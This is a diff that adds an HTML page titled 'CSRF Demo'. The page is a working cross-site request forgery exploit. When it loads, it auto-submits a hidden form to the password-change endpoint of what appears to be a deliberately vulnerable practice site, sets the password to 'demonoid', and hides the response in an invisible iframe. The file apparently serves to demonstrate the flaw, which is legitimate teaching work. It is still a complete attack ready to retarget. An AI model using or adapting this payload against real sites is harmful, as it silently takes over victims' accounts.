@@ -1,0 +1,11 @@
+<html><head><meta name="referrer" content="origin">
+    <title>CSRF</title>
+  <style type="text/css"></style></head>
+  <body onload="document.csrfForm.submit()">
+    <h1>CSRF Demo</h1>
+    <form action="http://hackyourselffirst.troyhunt.com/Account/ChangePassword" method="POST" target="hiddenFrame" name="csrfForm">
+      <input type="hidden" name="NewPassword" value="demonoid" />
+      <input type="hidden" name="ConfirmPassword" value="demonoid" />
+    </form>
+    <iframe name="hiddenFrame" style="display: none;" src="http://hackyourselffirst.troyhunt.com/"></iframe>
+</body></html>
